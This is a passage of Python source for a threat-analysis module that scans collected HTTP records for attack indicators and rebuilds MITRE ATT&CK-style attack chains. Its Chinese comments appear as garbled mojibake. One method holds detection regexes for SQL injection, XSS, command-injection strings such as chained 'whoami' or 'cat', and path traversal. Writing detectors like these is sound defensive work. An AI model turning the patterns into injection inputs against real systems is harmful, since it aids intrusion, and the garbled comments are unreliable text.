            # åˆ†æAPIç«¯ç‚¹ä½¿ç”¨æ¨¡å¼
            endpoint_usage = defaultdict(int)
            method_usage = defaultdict(int)
            
            if hasattr(self.parent, 'data_records'):
                for record in self.parent.data_records:
                    if hasattr(record, 'source_url'):
                        try:
                            parsed = urlparse(record.source_url)
                            endpoint = parsed.path
                            endpoint_usage[endpoint] += 1
                        except:
                            pass
                    
                    if hasattr(record, 'metadata') and 'method' in record.metadata:
                        method_usage[record.metadata['method']] += 1
            
            # åˆ†æç«¯ç‚¹çƒ­ç‚¹
            if endpoint_usage:
                sorted_endpoints = sorted(endpoint_usage.items(), key=lambda x: x[1], reverse=True)
                hottest_endpoints = sorted_endpoints[:5]
                
                api_patterns.append({
                    'type': 'api_endpoint_usage_behavior',
                    'hottest_endpoints': hottest_endpoints,
                    'total_unique_endpoints': len(endpoint_usage),
                    'total_requests': sum(endpoint_usage.values()),
                    'usage_concentration': hottest_endpoints[0][1] / sum(endpoint_usage.values()) if hottest_endpoints else 0,
                    'timestamp': datetime.now().isoformat()
                })
            
            # åˆ†æHTTPæ–¹æ³•ä½¿ç”¨æ¨¡å¼
            if method_usage:
                api_patterns.append({
                    'type': 'api_method_usage_behavior',
                    'method_distribution': dict(method_usage),
                    'most_used_method': max(method_usage, key=method_usage.get),
                    'method_diversity': len(method_usage),
                    'timestamp': datetime.now().isoformat()
                })
            
            return api_patterns
        
        async def _analyze_security_behavior_patterns(self) -> List[Dict]:
            """åˆ†æå®‰å…¨è¡Œä¸ºæ¨¡å¼"""
            security_patterns = []
            
            # åˆ†æè®¤è¯è¡Œä¸º
            auth_attempts = []
            auth_failures = []
            auth_successes = []
            
            if hasattr(self.parent, 'data_records'):
                for record in self.parent.data_records:
                    record_type = getattr(record, 'record_type', '')
                    
                    if 'auth' in record_type.lower():
                        auth_attempts.append(record)
                        
                        if hasattr(record, 'metadata'):
                            status = record.metadata.get('status_code', 0)
                            if status in [401, 403]:
                                auth_failures.append(record)
                            elif status == 200:
                                auth_successes.append(record)
            
            # åˆ†æè®¤è¯è¡Œä¸ºæ¨¡å¼
            if auth_attempts:
                failure_rate = len(auth_failures) / len(auth_attempts) * 100
                success_rate = len(auth_successes) / len(auth_attempts) * 100
                
                security_patterns.append({
                    'type': 'authentication_behavior_pattern',
                    'total_auth_attempts': len(auth_attempts),
                    'failure_rate_percent': failure_rate,
                    'success_rate_percent': success_rate,
                    'security_posture': 'weak' if failure_rate < 50 else 'strong',
                    'timestamp': datetime.now().isoformat()
                })
            
            return security_patterns
        
        async def _execute_threat_intelligence_mining(self) -> List[Dict]:
            """æ‰§è¡Œå¨èƒæƒ…æŠ¥æŒ–æ˜"""
            print(f"[ğŸš¨] æ‰§è¡Œå¨èƒæƒ…æŠ¥æŒ–æ˜...")
            
            threat_intelligence = []
            
            # æŒ–æ˜å·²çŸ¥å¨èƒæŒ‡æ ‡
            known_threats = await self._mine_known_threat_indicators()
            threat_intelligence.extend(known_threats)
            
            # æŒ–æ˜å¼‚å¸¸è¡Œä¸ºæŒ‡æ ‡
            anomaly_indicators = await self._mine_anomaly_indicators()
            threat_intelligence.extend(anomaly_indicators)
            
            # æŒ–æ˜æ”»å‡»æ¨¡å¼æŒ‡æ ‡
            attack_patterns = await self._mine_attack_pattern_indicators()
            threat_intelligence.extend(attack_patterns)
            
            return threat_intelligence
        
        async def _mine_known_threat_indicators(self) -> List[Dict]:
            """æŒ–æ˜å·²çŸ¥å¨èƒæŒ‡æ ‡"""
            threat_indicators = []
            
            # å®šä¹‰å¨èƒæŒ‡æ ‡æ¨¡å¼
            threat_patterns = {
                'sql_injection_indicators': [
                    r'(?:union|select|insert|update|delete)\s+.*(?:from|into|where)',
                    r'(?:\'|\")(?:.*(?:union|select|insert|update|delete).*(?:\'|\"))',
                    r'(?:\'|\")\s*(?:or|and)\s*(?:\'|\")?\d+(?:\'|\")?\s*=\s*(?:\'|\")?\d+'
                ],
                'xss_indicators': [
                    r'<script[^>]*>.*?</script>',
                    r'javascript:',
                    r'on\w+\s*=\s*["\'][^"\']*["\']'
                ],
                'command_injection_indicators': [
                    r'(?:;|\||\&\&|\|\|)\s*(?:cat|ls|pwd|whoami|id|uname)',
                    r'(?:`|\$\()\s*(?:cat|ls|pwd|whoami|id|uname)'
                ],
                'path_traversal_indicators': [
                    r'\.\./',
                    r'\.\.\\',
                    r'%2e%2e%2f',
                    r'%2e%2e%5c'
                ]
            }
            
            # åœ¨æ”¶é›†çš„æ•°æ®ä¸­æœç´¢å¨èƒæŒ‡æ ‡
            data_sources = []
            if hasattr(self.parent, 'data_records'):
                data_sources.extend(self.parent.data_records)
            
            for threat_type, patterns in threat_patterns.items():
                for data_item in data_sources[:50]:  # é™åˆ¶æ£€æŸ¥çš„æ•°æ®æ•°é‡
                    text_data = self._extract_text_from_data_item(data_item)
                    
                    for pattern in patterns:
                        matches = re.findall(pattern, text_data, re.IGNORECASE)
                        
                        if matches:
                            threat_indicators.append({
                                'type': f'threat_indicator_{threat_type}',
                                'pattern_matched': pattern,
                                'matches': matches[:3],  # é™åˆ¶åŒ¹é…æ•°é‡
                                'source': self._get_data_item_identifier(data_item),
                                'severity': 'high',
                                'threat_category': threat_type,
                                'timestamp': datetime.now().isoformat()
                            })
                            
                            # æ·»åŠ åˆ°å¨èƒæŒ‡æ ‡é›†åˆ
                            self.threat_indicators.add(threat_type)
                            
                            print(f"    [] å‘ç°å¨èƒæŒ‡æ ‡: {threat_type} - {len(matches)} matches")
            
            return threat_indicators
        
        async def _mine_anomaly_indicators(self) -> List[Dict]:
            """æŒ–æ˜å¼‚å¸¸è¡Œä¸ºæŒ‡æ ‡"""
            anomaly_indicators = []
            
            # åˆ†æå“åº”å¤§å°å¼‚å¸¸
            response_sizes = []
            if hasattr(self.parent, 'data_records'):
                for record in self.parent.data_records:
                    if hasattr(record, 'data'):
                        size = len(str(record.data))
                        response_sizes.append(size)
            
            if response_sizes and len(response_sizes) >= 10:
                avg_size = sum(response_sizes) / len(response_sizes)
                std_dev = (sum((x - avg_size) ** 2 for x in response_sizes) / len(response_sizes)) ** 0.5
                
                # æ£€æµ‹å¼‚å¸¸å¤§å°çš„å“åº”
                anomalies = [size for size in response_sizes if abs(size - avg_size) > 2 * std_dev]
                
                if anomalies:
                    anomaly_indicators.append({
                        'type': 'response_size_anomaly',
                        'average_size': avg_size,
                        'standard_deviation': std_dev,
                        'anomalous_sizes': anomalies[:5],
                        'anomaly_count': len(anomalies),
                        'severity': 'medium',
                        'timestamp': datetime.now().isoformat()
                    })
            
            return anomaly_indicators
        
        async def _mine_attack_pattern_indicators(self) -> List[Dict]:
            """æŒ–æ˜æ”»å‡»æ¨¡å¼æŒ‡æ ‡"""
            attack_indicators = []
            
            # åˆ†æè¯·æ±‚é¢‘ç‡å¼‚å¸¸ï¼ˆå¯èƒ½çš„æš´åŠ›ç ´è§£ï¼‰
            request_timestamps = []
            if hasattr(self.parent, 'data_records'):
                for record in self.parent.data_records:
                    if hasattr(record, 'timestamp'):
                        try:
                            timestamp = datetime.fromisoformat(record.timestamp.replace('Z', '+00:00'))
                            request_timestamps.append(timestamp)
                        except:
                            continue
            
            if len(request_timestamps) >= 20:
                # è®¡ç®—è¯·æ±‚é—´éš”
                request_timestamps.sort()
                intervals = []
                for i in range(1, len(request_timestamps)):
                    interval = (request_timestamps[i] - request_timestamps[i-1]).total_seconds()
                    intervals.append(interval)
                
                # æ£€æµ‹é«˜é¢‘è¯·æ±‚æ¨¡å¼ï¼ˆå¯èƒ½çš„è‡ªåŠ¨åŒ–æ”»å‡»ï¼‰
                short_intervals = [interval for interval in intervals if interval < 1.0]  # 1ç§’å†…çš„è¯·æ±‚
                
                if len(short_intervals) > len(intervals) * 0.5:  # è¶…è¿‡50%çš„è¯·æ±‚é—´éš”å°äº1ç§’
                    attack_indicators.append({
                        'type': 'automated_attack_pattern',
                        'total_requests': len(request_timestamps),
                        'short_interval_count': len(short_intervals),
                        'short_interval_percentage': len(short_intervals) / len(intervals) * 100,
                        'average_interval': sum(intervals) / len(intervals),
                        'severity': 'high',
                        'attack_classification': 'automated_scanning_or_brute_force',
                        'timestamp': datetime.now().isoformat()
                    })
            
            return attack_indicators
        
        async def _execute_data_correlation_mining(self) -> List[Dict]:
            """æ‰§è¡Œæ•°æ®å…³è”æŒ–æ˜"""
            print(f"[] æ‰§è¡Œæ•°æ®å…³è”æŒ–æ˜...")
            
            correlation_results = []
            
            # æ‰§è¡Œå„ç§å…³è”åˆ†æ
            for correlation_type, analysis_func in self.correlation_rules.items():
                try:
                    correlations = await analysis_func()
                    correlation_results.extend(correlations)
                except Exception as e:
                    print(f"    [] å…³è”åˆ†æå¤±è´¥ {correlation_type}: {e}")
            
            return correlation_results
        
        async def _temporal_correlation_analysis(self) -> List[Dict]:
            """æ—¶é—´å…³è”åˆ†æ"""
            correlations = []
            
            # åˆ†ææ—¶é—´ç›¸å…³çš„æ•°æ®å…³è”
            temporal_groups = defaultdict(list)
            
            if hasattr(self.parent, 'data_records'):
                for record in self.parent.data_records:
                    if hasattr(record, 'timestamp'):
                        try:
                            timestamp = datetime.fromisoformat(record.timestamp.replace('Z', '+00:00'))
                            # æŒ‰å°æ—¶åˆ†ç»„
                            hour_key = timestamp.replace(minute=0, second=0, microsecond=0)
                            temporal_groups[hour_key].append(record)
                        except:
                            continue
            
            # åˆ†ææ—¶é—´æ®µå†…çš„æ´»åŠ¨å…³è”
            for time_key, records in temporal_groups.items():
                if len(records) >= 5:  # è‡³å°‘5ä¸ªè®°å½•æ‰åˆ†æ
                    record_types = [getattr(r, 'record_type', 'unknown') for r in records]
                    type_distribution = defaultdict(int)
                    for rt in record_types:
                        type_distribution[rt] += 1
                    
                    correlations.append({
                        'type': 'temporal_activity_correlation',
                        'time_window': time_key.isoformat(),
                        'total_activities': len(records),
                        'activity_types': dict(type_distribution),
                        'correlation_strength': len(set(record_types)) / len(records),  # å¤šæ ·æ€§æŒ‡æ ‡
                        'timestamp': datetime.now().isoformat()
                    })
            
            return correlations
        
        async def _structural_correlation_analysis(self) -> List[Dict]:
            """ç»“æ„å…³è”åˆ†æ"""
            correlations = []
            
            # åˆ†æURLç»“æ„å…³è”
            url_structures = defaultdict(list)
            
            if hasattr(self.parent, 'data_records'):
                for record in self.parent.data_records:
                    if hasattr(record, 'source_url'):
                        try:
                            parsed = urlparse(record.source_url)
                            path_parts = [part for part in parsed.path.split('/') if part]
                            
                            # åˆ†æè·¯å¾„ç»“æ„
                            if len(path_parts) >= 2:
                                structure_key = '/'.join(path_parts[:2])  # å–å‰ä¸¤ä¸ªè·¯å¾„éƒ¨åˆ†
                                url_structures[structure_key].append(record)
                        except:
                            continue
            
            # åˆ†æç»“æ„ç›¸å…³æ€§
            for structure, records in url_structures.items():
                if len(records) >= 3:
                    success_count = 0
                    total_count = len(records)
                    
                    for record in records:
                        if hasattr(record, 'metadata') and record.metadata.get('status_code') == 200:
                            success_count += 1
                    
                    success_rate = success_count / total_count
                    
                    correlations.append({
                        'type': 'structural_url_correlation',
                        'url_structure': structure,
                        'total_requests': total_count,
                        'success_rate': success_rate,
                        'correlation_strength': 'high' if success_rate > 0.8 else 'medium' if success_rate > 0.5 else 'low',
                        'timestamp': datetime.now().isoformat()
                    })
            
            return correlations
        
        async def _behavioral_correlation_analysis(self) -> List[Dict]:
            """è¡Œä¸ºå…³è”åˆ†æ"""
            correlations = []
            
            # åˆ†ææˆåŠŸ/å¤±è´¥æ¨¡å¼çš„å…³è”
            success_patterns = []
            failure_patterns = []
            
            if hasattr(self.parent, 'data_records'):
                for record in self.parent.data_records:
                    if hasattr(record, 'metadata'):
                        status = record.metadata.get('status_code', 0)
                        record_type = getattr(record, 'record_type', 'unknown')
                        
                        if status == 200:
                            success_patterns.append(record_type)
                        elif status in [401, 403, 404, 500]:
                            failure_patterns.append(record_type)
            
            # åˆ†ææˆåŠŸæ¨¡å¼å…³è”
            if success_patterns:
                success_distribution = defaultdict(int)
                for pattern in success_patterns:
                    success_distribution[pattern] += 1
                
                correlations.append({
                    'type': 'success_behavior_correlation',
                    'pattern_distribution': dict(success_distribution),
                    'total_successes': len(success_patterns),
                    'unique_success_patterns': len(success_distribution),
                    'timestamp': datetime.now().isoformat()
                })
            
            # åˆ†æå¤±è´¥æ¨¡å¼å…³è”
            if failure_patterns:
                failure_distribution = defaultdict(int)
                for pattern in failure_patterns:
                    failure_distribution[pattern] += 1
                
                correlations.append({
                    'type': 'failure_behavior_correlation',
                    'pattern_distribution': dict(failure_distribution),
                    'total_failures': len(failure_patterns),
                    'unique_failure_patterns': len(failure_distribution),
                    'timestamp': datetime.now().isoformat()
                })
            
            return correlations
        
        async def _threat_correlation_analysis(self) -> List[Dict]:
            """ğŸ—¡ï¸ é«˜çº§å¨èƒå…³è”åˆ†æå¼•æ“ - å¤šç»´åº¦å¨èƒæƒ…æŠ¥é‡å»º"""
            correlations = []
            
            #  é˜¶æ®µ1: æ—¶é—´åºåˆ—å¨èƒå…³è”åˆ†æ
            temporal_correlations = await self._analyze_temporal_threat_patterns()
            correlations.extend(temporal_correlations)
            
            #  é˜¶æ®µ2: æ”»å‡»é“¾é‡å»ºä¸åˆ†æ
            attack_chain_correlations = await self._reconstruct_attack_chains()
            correlations.extend(attack_chain_correlations)
            
            #  é˜¶æ®µ3: å¨èƒä¸¥é‡æ€§æƒé‡å…³è”
            severity_correlations = await self._analyze_threat_severity_correlations()
            correlations.extend(severity_correlations)
            
            #  é˜¶æ®µ4: åœ°ç†ä½ç½®å¨èƒå…³è” (åŸºäºIPæ¨¡å¼)
            geo_correlations = await self._analyze_geographical_threat_patterns()
            correlations.extend(geo_correlations)
            
            #  é˜¶æ®µ5: IoC (Indicators of Compromise) äº¤å‰å…³è”
            ioc_correlations = await self._analyze_ioc_cross_correlations()
            correlations.extend(ioc_correlations)
            
            #  é˜¶æ®µ6: å¨èƒæ¼”åŒ–åˆ†æ
            evolution_correlations = await self._analyze_threat_evolution_patterns()
            correlations.extend(evolution_correlations)
            
            #  é˜¶æ®µ7: å¤šç»´åº¦å¨èƒæŒ‡æ ‡èšç±»
            cluster_correlations = await self._perform_multidimensional_threat_clustering()
            correlations.extend(cluster_correlations)
            
            return correlations
        
        async def _analyze_temporal_threat_patterns(self) -> List[Dict]:
            """ğŸ• æ—¶é—´åºåˆ—å¨èƒæ¨¡å¼åˆ†æ"""
            correlations = []
            
            # ä»æ•°æ®è®°å½•ä¸­æå–å¨èƒæ—¶é—´çº¿
            threat_timeline = []
            if hasattr(self.parent, 'data_records'):
                for record in self.parent.data_records:
                    if hasattr(record, 'timestamp') and hasattr(record, 'record_type'):
                        try:
                            timestamp = datetime.fromisoformat(record.timestamp.replace('Z', '+00:00'))
                            threat_timeline.append({
                                'timestamp': timestamp,
                                'threat_type': record.record_type,
                                'metadata': getattr(record, 'metadata', {}),
                                'severity': record.metadata.get('severity', 'unknown') if hasattr(record, 'metadata') else 'unknown'
                            })
                        except:
                            continue
            
            # æŒ‰æ—¶é—´æ’åº
            threat_timeline.sort(key=lambda x: x['timestamp'])
            
            #  æ—¶é—´çª—å£åˆ†æ (æ»‘åŠ¨çª—å£ç®—æ³•)
            time_windows = [
                timedelta(minutes=5),   # 5åˆ†é’Ÿçª—å£ - å¿«é€Ÿæ”»å‡»åºåˆ—
                timedelta(minutes=30),  # 30åˆ†é’Ÿçª—å£ - ä¸­ç­‰æ”»å‡»æ´»åŠ¨
                timedelta(hours=2),     # 2å°æ—¶çª—å£ - é•¿æœŸæ”»å‡»æ´»åŠ¨
                timedelta(hours=24)     # 24å°æ—¶çª—å£ - æ”»å‡»æˆ˜å½¹
            ]
            
            for window_size in time_windows:
                window_correlations = self._analyze_threat_time_window(threat_timeline, window_size)
                correlations.extend(window_correlations)
            
            return correlations
        
        def _analyze_threat_time_window(self, timeline: List[Dict], window_size: timedelta) -> List[Dict]:
            """åˆ†æç‰¹å®šæ—¶é—´çª—å£å†…çš„å¨èƒå…³è”"""
            correlations = []
            
            for i, base_threat in enumerate(timeline):
                window_start = base_threat['timestamp']
                window_end = window_start + window_size
                
                # åœ¨æ—¶é—´çª—å£å†…æŸ¥æ‰¾ç›¸å…³å¨èƒ
                related_threats = []
                for j, candidate_threat in enumerate(timeline[i+1:], start=i+1):
                    if candidate_threat['timestamp'] > window_end:
                        break
                    related_threats.append(candidate_threat)
                
                if len(related_threats) >= 2:  # è‡³å°‘2ä¸ªç›¸å…³å¨èƒ
                    #  å¨èƒåºåˆ—åˆ†æ
                    sequence_analysis = self._analyze_threat_sequence(base_threat, related_threats)
                    
                    if sequence_analysis['correlation_strength'] > 0.6:
                        correlations.append({
                            'type': 'temporal_threat_correlation',
                            'window_size_minutes': window_size.total_seconds() / 60,
                            'primary_threat': base_threat['threat_type'],
                            'related_threats': [t['threat_type'] for t in related_threats],
                            'sequence_analysis': sequence_analysis,
                            'attack_pattern': sequence_analysis['pattern_type'],
                            'timestamp': datetime.now().isoformat()
                        })
            
            return correlations
        
        def _analyze_threat_sequence(self, base_threat: Dict, related_threats: List[Dict]) -> Dict:
            """åˆ†æå¨èƒåºåˆ—æ¨¡å¼"""
            
            #  å·²çŸ¥æ”»å‡»æ¨¡å¼åŒ¹é…
            known_patterns = {
                'reconnaissance_to_exploitation': {
                    'sequence': ['endpoint_discovery', 'ghost_injection_success', 'data_tampering'],
                    'pattern_strength': 0.9
                },
                'privilege_escalation_chain': {
                    'sequence': ['authentication_bypass', 'privilege_escalation', 'administrative_access'],
                    'pattern_strength': 0.95
                },
                'data_exfiltration_chain': {
                    'sequence': ['api_abuse', 'bulk_data_access', 'sensitive_data_exposure'],
                    'pattern_strength': 0.85
                },
                'medical_data_breach': {
                    'sequence': ['medical_system_detection', 'patient_data_access', 'phi_exposure'],
                    'pattern_strength': 0.98
                }
            }
            
            threat_sequence = [base_threat['threat_type']] + [t['threat_type'] for t in related_threats]
            
            # æ¨¡å¼åŒ¹é…è¯„åˆ†
            best_match = None
            best_score = 0.0
            
            for pattern_name, pattern_info in known_patterns.items():
                score = self._calculate_sequence_match_score(threat_sequence, pattern_info['sequence'])
                if score > best_score:
                    best_score = score
                    best_match = pattern_name
            
            #  åºåˆ—å¤æ‚åº¦åˆ†æ
            complexity_metrics = self._calculate_sequence_complexity(threat_sequence, related_threats)
            
            return {
                'correlation_strength': best_score,
                'pattern_type': best_match or 'unknown_pattern',
                'sequence_length': len(threat_sequence),
                'complexity_metrics': complexity_metrics,
                'threat_sequence': threat_sequence
            }
        
        def _calculate_sequence_match_score(self, observed_sequence: List[str], pattern_sequence: List[str]) -> float:
            """è®¡ç®—åºåˆ—åŒ¹é…å¾—åˆ†"""
            if not observed_sequence or not pattern_sequence:
                return 0.0
            
            #  å­åºåˆ—åŒ¹é…ç®—æ³• (æœ€é•¿å…¬å…±å­åºåˆ—)
            def lcs_length(seq1, seq2):
                m, n = len(seq1), len(seq2)
                dp = [[0] * (n + 1) for _ in range(m + 1)]
                
                for i in range(1, m + 1):
                    for j in range(1, n + 1):
                        if seq1[i-1] == seq2[j-1]:
                            dp[i][j] = dp[i-1][j-1] + 1
                        else:
                            dp[i][j] = max(dp[i-1][j], dp[i][j-1])
                
                return dp[m][n]
            
            lcs_len = lcs_length(observed_sequence, pattern_sequence)
            max_len = max(len(observed_sequence), len(pattern_sequence))
            
            #  é¡ºåºæƒé‡ (é¡ºåºåŒ¹é…æ›´é‡è¦)
            order_bonus = 0.0
            for i, obs_threat in enumerate(observed_sequence):
                if i < len(pattern_sequence) and obs_threat == pattern_sequence[i]:
                    order_bonus += 0.1
            
            base_score = lcs_len / max_len if max_len > 0 else 0.0
            return min(base_score + order_bonus, 1.0)
        
        def _calculate_sequence_complexity(self, threat_sequence: List[str], related_threats: List[Dict]) -> Dict:
            """è®¡ç®—åºåˆ—å¤æ‚åº¦æŒ‡æ ‡"""
            
            #  å¨èƒå¤šæ ·æ€§
            unique_threats = len(set(threat_sequence))
            diversity_score = unique_threats / len(threat_sequence) if threat_sequence else 0.0
            
            #  ä¸¥é‡æ€§é€’å¢æ¨¡å¼
            severity_values = {'low': 1, 'medium': 2, 'high': 3, 'critical': 4, 'unknown': 0}
            severity_progression = []
            
            for threat in related_threats:
                severity = threat.get('severity', 'unknown')
                severity_progression.append(severity_values.get(severity, 0))
            
            escalation_trend = 0.0
            if len(severity_progression) > 1:
                increases = sum(1 for i in range(1, len(severity_progression)) 
                              if severity_progression[i] > severity_progression[i-1])
                escalation_trend = increases / (len(severity_progression) - 1)
            
            #  æ—¶é—´é—´éš”åˆ†æ
            time_intervals = []
            for i in range(1, len(related_threats)):
                interval = (related_threats[i]['timestamp'] - related_threats[i-1]['timestamp']).total_seconds()
                time_intervals.append(interval)
            
            avg_interval = sum(time_intervals) / len(time_intervals) if time_intervals else 0.0
            import numpy as np
            interval_consistency = 1.0 - (np.std(time_intervals) / max(avg_interval, 1)) if time_intervals else 0.0
            
            return {
                'diversity_score': diversity_score,
                'escalation_trend': escalation_trend,
                'average_interval_seconds': avg_interval,
                'timing_consistency': max(0.0, min(1.0, interval_consistency)),
                'complexity_rating': (diversity_score + escalation_trend + min(interval_consistency, 1.0)) / 3
            }
        
        async def _reconstruct_attack_chains(self) -> List[Dict]:
            """ æ”»å‡»é“¾é‡å»ºåˆ†æ"""
            correlations = []
            
            #  åŸºäºMITRE ATT&CKæ¡†æ¶çš„æ”»å‡»é“¾è¯†åˆ«
            attack_techniques = {
                'reconnaissance': ['endpoint_discovery', 'system_discovery', 'network_discovery'],
                'initial_access': ['authentication_bypass', 'exploit_public_facing'],
                'execution': ['command_injection', 'script_execution'],
                'persistence': ['account_creation', 'scheduled_task'],
                'privilege_escalation': ['privilege_escalation_success', 'admin_access'],
                'defense_evasion': ['obfuscation', 'disable_security_tools'],
                'credential_access': ['credential_dumping', 'brute_force'],
                'discovery': ['system_info_discovery', 'network_service_scanning'],
                'lateral_movement': ['remote_services', 'exploitation_of_remote_services'],
                'collection': ['data_from_information_repositories', 'screen_capture'],
                'exfiltration': ['data_transfer_size_limits', 'exfiltration_over_web']
            }
            
            # ä»æ•°æ®è®°å½•ä¸­è¯†åˆ«æ”»å‡»æŠ€æœ¯
            detected_techniques = defaultdict(list)
            
            if hasattr(self.parent, 'data_records'):
                for record in self.parent.data_records:
                    record_type = getattr(record, 'record_type', '')
                    timestamp = getattr(record, 'timestamp', '')
                    
                    for tactic, techniques in attack_techniques.items():
                        if any(tech in record_type for tech in techniques):
                            detected_techniques[tactic].append({
                                'record': record,
                                'timestamp': timestamp,
                                'technique': record_type
                            })
            
            #  æ”»å‡»é“¾è·¯å¾„åˆ†æ
            if len(detected_techniques) >= 2:
                chain_analysis = self._analyze_attack_chain_progression(detected_techniques)
                
                correlations.append({
                    'type': 'attack_chain_reconstruction',
                    'detected_tactics': list(detected_techniques.keys()),
                    'chain_completeness': len(detected_techniques) / len(attack_techniques),
                    'attack_progression': chain_analysis,
                    'mitre_framework_mapping': True,
                    'timestamp': datetime.now().isoformat()
                })
            
            return correlations
        
        def _analyze_attack_chain_progression(self, detected_techniques: Dict) -> Dict:
            """åˆ†ææ”»å‡»é“¾è¿›å±•"""
            
            # MITRE ATT&CK æˆ˜æœ¯é¡ºåº
            tactic_order = [
                'reconnaissance', 'initial_access', 'execution', 'persistence',
                'privilege_escalation', 'defense_evasion', 'credential_access',
                'discovery', 'lateral_movement', 'collection', 'exfiltration'
            ]
            
            progression_score = 0.0
            detected_order = []
            
            for tactic in tactic_order:
                if tactic in detected_techniques:
                    detected_order.append(tactic)
            
            # è®¡ç®—æ”»å‡»é“¾å®Œæ•´æ€§
            if detected_order:
                # é¡ºåºä¸€è‡´æ€§å¾—åˆ†
                order_consistency = sum(1 for i in range(len(detected_order)-1) 
                                      if tactic_order.index(detected_order[i]) < tactic_order.index(detected_order[i+1]))
                order_consistency = order_consistency / max(len(detected_order)-1, 1)
                
                # è¦†ç›–åº¦å¾—åˆ†
                coverage_score = len(detected_order) / len(tactic_order)
                
                progression_score = (order_consistency * 0.7) + (coverage_score * 0.3)
            
            return {
                'progression_score': progression_score,
                'detected_tactics_order': detected_order,
                'attack_chain_completeness': len(detected_order) / len(tactic_order),
                'attack_sophistication': 'high' if progression_score > 0.7 else 'medium' if progression_score > 0.4 else 'low'
            }
        
        async def _analyze_threat_severity_correlations(self) -> List[Dict]:
            """ å¨èƒä¸¥é‡æ€§æƒé‡å…³è”åˆ†æ"""
            correlations = []
            
            # æ”¶é›†å¨èƒä¸¥é‡æ€§æ•°æ®
            severity_matrix = defaultdict(lambda: defaultdict(int))
            
            if hasattr(self.parent, 'data_records'):
                for record in self.parent.data_records:
                    record_type = getattr(record, 'record_type', 'unknown')
                    severity = 'unknown'
                    
                    if hasattr(record, 'metadata') and isinstance(record.metadata, dict):
                        severity = record.metadata.get('severity', 'unknown')
                    
                    severity_matrix[severity][record_type] += 1
            
            #  ä¸¥é‡æ€§å…³è”åˆ†æ
            for severity_level, threat_types in severity_matrix.items():
                if len(threat_types) >= 2:  # è‡³å°‘2ç§å¨èƒç±»å‹
                    
                    # è®¡ç®—å¨èƒç±»å‹çš„å…±ç°å¼ºåº¦
                    threat_list = list(threat_types.items())
                    correlations_in_severity = []
                    
                    for i, (threat1, count1) in enumerate(threat_list):
                        for threat2, count2 in threat_list[i+1:]:
                            correlation_strength = min(count1, count2) / max(count1, count2)
                            
                            correlations_in_severity.append({
                                'threat_pair': f"{threat1}+{threat2}",
                                'correlation_strength': correlation_strength,
                                'frequency_threat1': count1,
                                'frequency_threat2': count2
                            })
                    
                    if correlations_in_severity:
                        correlations.append({
                            'type': 'severity_weighted_correlation',
                            'severity_level': severity_level,
                            'threat_correlations': correlations_in_severity,
                            'total_threats_in_severity': len(threat_types),
                            'timestamp': datetime.now().isoformat()
                        })
            
            return correlations
        
        async def _analyze_geographical_threat_patterns(self) -> List[Dict]:
            """ åœ°ç†ä½ç½®å¨èƒå…³è”åˆ†æ"""
            correlations = []
            
            # ä»è¯·æ±‚æ•°æ®ä¸­æå–IPåœ°å€æ¨¡å¼
            ip_patterns = defaultdict(list)
            
            if hasattr(self.parent, 'data_records'):
                for record in self.parent.data_records:
                    # å°è¯•ä»å…ƒæ•°æ®ä¸­æå–IPä¿¡æ¯
                    ip_info = self._extract_ip_from_record(record)
                    if ip_info:
                        threat_type = getattr(record, 'record_type', 'unknown')
                        ip_patterns[ip_info['ip_range']].append({
                            'threat_type': threat_type,
                            'timestamp': getattr(record, 'timestamp', ''),
                            'ip_info': ip_info
                        })
            
            #  åœ°ç†èšç±»åˆ†æ
            for ip_range, threats in ip_patterns.items():
                if len(threats) >= 3:  # è‡³å°‘3ä¸ªå¨èƒäº‹ä»¶
                    geo_analysis = self._analyze_geo_threat_cluster(threats)
                    
                    correlations.append({
                        'type': 'geographical_threat_correlation',
                        'ip_range': ip_range,
                        'threat_count': len(threats),
                        'unique_threat_types': len(set(t['threat_type'] for t in threats)),
                        'geo_analysis': geo_analysis,
                        'timestamp': datetime.now().isoformat()
                    })
            
            return correlations
        
        def _extract_ip_from_record(self, record) -> Optional[Dict]:
            """ä»è®°å½•ä¸­æå–IPä¿¡æ¯"""
            try:
                # å°è¯•å¤šç§æ–¹å¼æå–IP
                ip_sources = []
                
                if hasattr(record, 'metadata') and isinstance(record.metadata, dict):
                    # ä»å…ƒæ•°æ®ä¸­æŸ¥æ‰¾IP
                    for key in ['ip', 'source_ip', 'client_ip', 'remote_addr']:
                        if key in record.metadata:
                            ip_sources.append(record.metadata[key])
                
                if hasattr(record, 'source_url'):
                    # ä»URLä¸­æå–IP
                    from urllib.parse import urlparse
                    parsed = urlparse(record.source_url)
                    if parsed.hostname:
                        ip_sources.append(parsed.hostname)
                
                # ç®€å•IPéªŒè¯å’ŒèŒƒå›´åˆ†ç±»
                for ip in ip_sources:
                    if self._is_valid_ip(ip):
                        return {
                            'ip': ip,
                            'ip_range': self._classify_ip_range(ip),
                            'is_private': self._is_private_ip(ip)
                        }
                
            except Exception:
                pass
            
            return None
        
        def _is_valid_ip(self, ip: str) -> bool:
            """ç®€å•IPéªŒè¯"""
            try:
                parts = ip.split('.')
                return len(parts) == 4 and all(0 <= int(part) <= 255 for part in parts)
            except:
                return False
        
        def _classify_ip_range(self, ip: str) -> str:
            """åˆ†ç±»IPèŒƒå›´"""
            try:
                first_octet = int(ip.split('.')[0])
                if first_octet in range(1, 127):
                    return 'class_a'
                elif first_octet in range(128, 192):
                    return 'class_b'
                elif first_octet in range(192, 224):
                    return 'class_c'
                else:
                    return 'special_use'
            except:
                return 'unknown'
        
        def _is_private_ip(self, ip: str) -> bool:
            """æ£€æŸ¥æ˜¯å¦ä¸ºç§æœ‰IP"""
            try:
                parts = [int(x) for x in ip.split('.')]
                return (parts[0] == 10 or 
                       (parts[0] == 172 and 16 <= parts[1] <= 31) or
                       (parts[0] == 192 and parts[1] == 168))
            except:
                return False
        
        def _analyze_geo_threat_cluster(self, threats: List[Dict]) -> Dict:
            """åˆ†æåœ°ç†å¨èƒèšç±»"""
            
            # æ—¶é—´åˆ†å¸ƒåˆ†æ
            timestamps = []
            for threat in threats:
                try:
                    ts = datetime.fromisoformat(threat['timestamp'].replace('Z', '+00:00'))
                    timestamps.append(ts)
                except:
                    continue
            
            time_span = max(timestamps) - min(timestamps) if len(timestamps) > 1 else timedelta(0)
            
            # å¨èƒç±»å‹åˆ†å¸ƒ
            threat_types = defaultdict(int)
            for threat in threats:
                threat_types[threat['threat_type']] += 1
            
            return {
                'time_span_hours': time_span.total_seconds() / 3600,
                'threat_type_distribution': dict(threat_types),
                'attack_frequency': len(threats) / max(time_span.total_seconds() / 3600, 1),
                'cluster_density': len(set(t['threat_type'] for t in threats)) / len(threats)
            }
        
